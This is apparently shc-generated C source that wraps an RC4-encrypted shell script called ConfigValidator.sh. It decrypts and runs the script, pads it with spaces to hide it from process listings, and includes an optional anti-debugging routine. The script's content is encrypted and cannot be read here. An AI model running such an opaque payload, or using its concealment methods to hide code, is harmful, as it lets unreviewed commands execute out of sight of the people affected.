#if 0
	shc Version 3.8.9b, Generic Script Compiler
	Copyright (c) 1994-2015 Francisco Rosales <frosal@fi.upm.es>

	./shc -v -r -T -f ./ConfigValidator.sh 
#endif

static  char data [] = 
#define      msg1_z	42
#define      msg1	((&data[6]))
	"\233\150\044\313\040\005\310\215\377\044\043\272\360\062\203\301"
	"\267\327\203\242\173\355\003\065\230\317\341\013\160\222\025\257"
	"\174\041\006\331\151\070\053\007\161\263\250\222\134\220\123\167"
	"\132"
#define      chk1_z	22
#define      chk1	((&data[51]))
	"\036\002\301\354\114\036\262\160\323\316\126\322\103\333\125\146"
	"\245\002\206\002\302\177\220\025\340\262\075\021"
#define      msg2_z	19
#define      msg2	((&data[77]))
	"\322\362\137\041\163\034\331\056\026\024\206\006\040\313\175\267"
	"\067\213\234\312"
#define      xecc_z	15
#define      xecc	((&data[99]))
	"\152\276\165\352\335\200\050\306\016\010\342\317\342\326\250\255"
	"\175"
#define      chk2_z	19
#define      chk2	((&data[118]))
	"\041\003\140\147\350\325\334\344\324\351\240\333\135\077\321\230"
	"\013\116\211\034\222\145\003\375\162\133"
#define      text_z	1633
#define      text	((&data[468]))
	"\332\223\133\117\353\157\261\253\233\243\035\167\326\172\152\035"
	"\101\260\305\012\170\154\302\114\065\020\023\076\356\070\072\277"
	"\152\331\254\253\373\123\144\076\067\200\154\336\363\223\106\042"
	"\141\214\277\011\064\125\324\043\034\240\310\130\375\366\242\112"
	"\177\362\352\073\002\312\163\254\025\316\167\210\017\137\306\143"
	"\267\003\017\235\073\240\047\334\161\136\257\341\265\327\212\252"
	"\332\025\210\104\346\176\362\206\321\365\026\227\050\070\176\033"
	"\142\160\050\162\353\141\370\353\364\265\215\351\022\022\035\264"
	"\227\212\263\256\215\312\147\114\301\131\025\365\000\267\337\233"
	"\365\035\073\016\302\355\032\140\002\246\212\212\166\220\166\143"
	"\301\153\074\347\370\320\007\221\031\220\107\206\307\117\322\244"
	"\214\171\221\302\113\374\176\363\017\073\037\275\013\243\357\377"
	"\312\337\255\361\206\105\235\012\060\044\176\106\243\055\273\044"
	"\254\120\100\001\253\117\043\105\324\234\155\153\167\307\001\326"
	"\370\115\336\172\005\153\122\056\335\075\110\336\054\101\265\342"
	"\057\107\146\320\172\366\156\201\036\360\226\335\343\220\237\377"
	"\161\217\342\117\031\060\343\325\204\317\326\311\114\370\210\206"
	"\115\236\203\363\065\174\164\160\210\044\021\167\330\004\340\342"
	"\016\245\055\264\025\050\070\300\247\154\264\263\032\257\322\125"
	"\062\020\331\224\257\040\201\324\021\354\052\217\205\244\045\263"
	"\175\165\341\154\246\304\124\070\113\022\327\355\200\173\222\207"
	"\201\066\360\011\364\057\376\366\340\301\275\355\236\320\003\036"
	"\375\263\160\163\034\043\307\277\177\371\161\166\050\177\334\311"
	"\241\012\041\321\317\211\272\330\040\351\214\311\341\000\352\235"
	"\353\350\003\074\126\031\377\227\145\064\301\266\335\002\112\011"
	"\046\053\005\145\124\301\315\242\021\153\355\314\011\342\221\304"
	"\121\336\326\162\376\247\070\147\124\157\211\063\010\301\350\205"
	"\130\337\141\073\203\011\345\243\227\166\162\302\201\164\331\064"
	"\121\006\006\326\362\300\022\051\317\164\132\046\057\221\040\225"
	"\255\376\254\341\066\053\105\211\034\146\206\201\134\272\064\252"
	"\264\036\147\274\354\262\277\132\373\303\211\352\266\377\250\324"
	"\006\126\167\076\252\067\307\025\025\231\020\132\340\336\360\107"
	"\214\155\047\014\315\170\120\235\175\233\372\170\351\173\272\335"
	"\006\106\102\303\247\255\070\153\153\302\054\037\221\061\277\076"
	"\153\021\033\002\003\232\345\326\160\341\200\343\356\054\260\237"
	"\337\234\112\160\374\105\126\071\314\110\036\014\241\025\365\106"
	"\072\130\333\135\157\302\127\043\207\000\034\104\240\012\205\054"
	"\041\054\271\221\166\210\011\066\052\324\134\141\236\240\007\244"
	"\035\143\211\247\001\215\173\363\332\153\235\255\046\045\255\140"
	"\351\257\205\147\262\232\077\022\070\010\075\233\017\313\241\155"
	"\360\113\143\225\356\356\243\260\015\077\206\256\273\347\260\242"
	"\105\114\231\213\366\117\310\326\035\055\146\334\127\312\151\132"
	"\042\362\057\153\223\064\311\054\237\331\030\346\267\123\001\227"
	"\147\262\136\073\216\042\360\310\253\157\144\214\050\375\012\056"
	"\264\253\006\231\052\321\215\273\250\127\151\047\166\005\076\005"
	"\122\061\113\017\073\346\276\164\333\221\067\310\321\177\162\216"
	"\057\107\064\013\141\217\056\044\304\072\140\077\366\253\125\003"
	"\055\165\046\311\226\272\107\011\040\145\241\202\005\174\146\210"
	"\044\213\157\350\324\356\215\142\244\244\133\302\024\027\332\075"
	"\314\017\153\122\142\261\303\300\136\021\270\314\326\370\235\226"
	"\320\167\042\012\171\255\271\234\331\147\327\140\367\123\242\102"
	"\260\204\120\165\213\056\064\335\336\075\367\212\216\005\316\223"
	"\272\267\212\127\020\034\053\267\102\234\175\177\113\134\112\246"
	"\067\212\006\024\323\056\172\370\206\072\205\361\030\150\247\212"
	"\345\022\255\306\170\233\016\002\230\273\121\347\032\131\005\166"
	"\054\165\210\170\110\046\024\046\000\053\352\077\020\140\062\014"
	"\276\172\251\375\134\357\257\206\040\366\226\334\235\212\167\135"
	"\062\377\252\067\264\204\126\163\223\243\247\340\031\211\350\154"
	"\032\074\275\122\375\035\276\366\177\104\135\254\037\134\374\372"
	"\375\001\122\131\342\226\023\147\155\200\231\317\203\067\343\226"
	"\310\321\022\277\240\362\242\360\364\017\056\111\110\032\235\234"
	"\364\216\115\357\027\215\343\145\152\322\330\140\304\337\042\262"
	"\324\147\155\270\110\000\167\372\246\050\205\231\067\161\222\337"
	"\220\347\256\343\064\137\150\325\267\375\146\020\053\021\120\171"
	"\327\011\363\221\362\266\345\373\200\265\207\200\167\200\245\021"
	"\264\311\333\253\022\155\363\231\303\300\066\244\024\111\264\024"
	"\101\245\311\043\115\242\031\347\257\241\014\051\100\326\323\135"
	"\151\316\024\037\206\023\020\125\036\363\021\214\350\214\357\106"
	"\255\277\122\057\162\144\146\047\061\160\337\105\040\121\133\001"
	"\323\102\034\164\305\053\113\110\252\176\072\272\220\313\156\321"
	"\213\116\022\273\176\212\130\366\113\320\116\010\004\011\023\024"
	"\037\222\240\174\375\301\067\364\025\270\015\232\353\037\014\354"
	"\263\134\055\001\120\060\131\130\232\204\343\337\055\326\147\131"
	"\273\231\154\153\314\376\344\211\263\215\177\310\371\246\225\011"
	"\215\001\221\342\112\220\026\027\355\114\205\374\226\211\064\126"
	"\041\134\321\353\276\107\170\231\000\145\372\010\146\346\261\310"
	"\244\327\352\253\221\363\261\331\341\100\135\204\163\237\300\375"
	"\037\000\126\246\035\200\034\040\263\216\213\210\205\065\064\316"
	"\035\251\344\013\176\044\322\353\225\266\304\055\104\131\213\162"
	"\177\023\112\251\250\077\303\271\156\027\012\145\075\120\005\162"
	"\273\325\106\313\354\370\231\262\132\041\302\060\106\211\153\061"
	"\036\346\006\250\063\006\174\050\210\050\304\301\242\274\055\121"
	"\376\176\055\325\155\365\200\000\146\352\107\135\150\332\330\220"
	"\216\127\277\230\310\161\145\030\300\327\107\242\026\267\102\241"
	"\302\353\035\252\134\125\261\120\354\132\373\162\063\177\257\361"
	"\170\353\214\314\212\272\275\174\110\214\033\372\106\107\172\205"
	"\061\351\377\077\144\360\165\200\050\051\254\101\173\354\233\104"
	"\361\143\352\030\340\341\006\360\370\206\124\166\215\107\231\346"
	"\027\330\137\233\311\301\005\366\021\342\350\235\127\334\116\275"
	"\031\220\156\301\244\030\304\217\207\256\036\136\333\362\175\345"
	"\047\017\065\256\213\132\101\143\216\376\353\074\372\362\222\217"
	"\115\344\226\042\044\177\326\122\144\317\015\300\226\236\261\346"
	"\045\132\065\355\250\120\161\031\120\032\001\217\056\237\151\360"
	"\177\131\276\114\252\162\201\001\114\003\355\352\303\244\177\151"
	"\137\014\021\312\165\003\065\316\351\345\232\167\017\235\170\037"
	"\100\122\371\034\205\150\327\217\333\247\001\044\146\305\347\324"
	"\100\072\147\065\367\246\007\017\031\337\177\016\215\022\134\005"
	"\253\315\124\146\170\236\335\326\041\157\240\204\001\251\115\353"
	"\306\046\176\370\044\106\314\127\046\327\033\020\131\300\312\207"
	"\076\151\336\226\251\276\341\177\361\224\210\170\124\341\156\022"
	"\257\370\242\132\340\212\167\033\312\013\037\224\004\051\156\157"
	"\043\035\101\215\361\107\036\362\331\247\037\250\207\127\124\226"
	"\253\136\045\331\054\043\226\310\133\312\002\066\116\112\366\151"
	"\322\213\226\364\150\312\053\276\230\003\143\150\273\366\225\012"
	"\117\354\031\341\347\211\203\050\103\066\262\373\257\165\263\034"
	"\256\324\267\252\137\310\365\155\125\177\265\106\037\301\135\344"
	"\203\064\235\200\351\204\352\151\041\165\302\046\111\110\305\314"
	"\220\325\353\001\203\356\322\146\032\005\143\361\134\061\007\173"
	"\055\066\277\053\000\054\077\315\332\076\343\375\003\074\260\253"
	"\176\055\331\350\117\240\321\113\303\054\026\240\103\276\055\350"
	"\024\040\345\076\074\261\332\221\060\225\312\344\150\032\051\334"
	"\066\075\005\330\020\150\304\114\264\062\114\077\061\043\264\254"
	"\054\334\226\237\305\326\165\265\016\004\274\037\070\014\377\336"
	"\355\242\123\323\226\336\142\077\271\256\044\254\237\273\035\115"
	"\257\371\225\233\103\336\371\353\044\030\150\372\343\000\112\266"
	"\047\112\334\365\034\275\133\100\225\032\221\101\133\315\106\251"
	"\334\231\134\236\327\376\372\271\042\350\263\006\322\305\252\133"
	"\352\027\130\236\153\257\057\141\325\215\324\113\347\027\177\103"
	"\327\330\036\276\122\265\044\200\025\025\223\275\253\010\276\301"
	"\331\264\062\310\062\126\070\154\150\146\210\343\207\204\124\130"
	"\343\226\032\123\301\126\366\275\033\306\323\072\051\143\251\024"
	"\272\321\032\164\143\242\024\067\126\063\132\340\133\332\076\052"
	"\275\170\224\175\152\122\246\266\161\151\013\020\004\170\273\245"
	"\151\021\153\306\204\006\311\374\247\035\162\260\076\005\270\122"
	"\053\236\304\250\162\025\105\361\027\341\223\155\330\017\377\055"
	"\236\361\000\354\017\077\274\105\217\371\251\225\230\113\011\317"
	"\065\237\010\176\137\004\133\035\001\223\277\065\010\117\253\334"
	"\234\342\340\342\326\020\310\304\102\132\020\144\313\352\022\250"
	"\306\241\144\362\167\126\174\361\330\245\111\332\003\030\175\044"
	"\023\311\221\201\363\233\166\373\172\253\165\047\003\141\120\304"
	"\211\361\207\103\243\367\143\203\156"
#define      tst1_z	22
#define      tst1	((&data[2230]))
	"\014\205\023\224\235\247\111\054\223\114\047\203\345\017\017\165"
	"\056\117\361\057\223\267\263\257"
#define      lsto_z	1
#define      lsto	((&data[2253]))
	"\001"
#define      pswd_z	256
#define      pswd	((&data[2274]))
	"\347\010\271\264\150\206\136\015\366\114\323\264\020\217\331\124"
	"\100\253\020\335\153\115\253\134\027\054\010\254\246\146\371\045"
	"\030\377\005\205\343\252\376\352\056\335\171\171\025\252\046\026"
	"\205\177\074\370\323\213\032\334\135\314\026\022\062\333\245\213"
	"\055\145\341\150\216\152\301\004\100\331\001\160\216\043\041\076"
	"\362\060\211\036\245\026\152\301\212\054\172\342\006\313\010\107"
	"\226\140\112\312\000\063\152\323\014\350\120\202\354\045\135\356"
	"\344\054\167\014\054\367\355\306\317\052\233\271\175\314\327\336"
	"\213\062\057\124\035\032\241\023\022\172\016\133\014\320\016\064"
	"\346\026\323\274\066\122\040\364\047\347\141\147\200\215\052\301"
	"\262\104\202\331\374\154\315\166\170\017\114\124\252\340\010\307"
	"\034\117\146\363\300\234\232\005\151\143\152\326\023\371\012\247"
	"\341\005\334\242\154\137\226\312\202\337\011\017\347\315\134\344"
	"\060\314\152\301\161\345\217\164\255\161\334\153\220\123\305\067"
	"\244\064\006\152\210\226\320\307\201\060\323\205\146\324\344\163"
	"\043\150\135\352\142\170\346\025\110\323\063\221\266\315\032\271"
	"\152\365\213\252\265\317\066\266\273\017\232\313\167\207\317\110"
	"\135\161\337\036\132\001\221\065\066\326\236\255\061\322\156\101"
	"\325\126\266\345\127\233\135\263\146\126\322\026\306\075\116\005"
	"\173\367\013\073\076\260\014\315\046\170\371\265\155\167\215\321"
	"\202\061\304\224\223\174\236\344\220\057\046\273\140\007\077\353"
	"\203\140\355\073"
#define      shll_z	8
#define      shll	((&data[2595]))
	"\353\337\372\041\022\264\303\351\006"
#define      date_z	1
#define      date	((&data[2603]))
	"\332"
#define      opts_z	1
#define      opts	((&data[2604]))
	"\371"
#define      rlax_z	1
#define      rlax	((&data[2605]))
	"\222"
#define      inlo_z	3
#define      inlo	((&data[2606]))
	"\037\174\041"
#define      tst2_z	19
#define      tst2	((&data[2609]))
	"\030\170\107\235\170\073\371\345\000\376\025\161\056\245\327\250"
	"\340\122\041\153\054\353\204"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
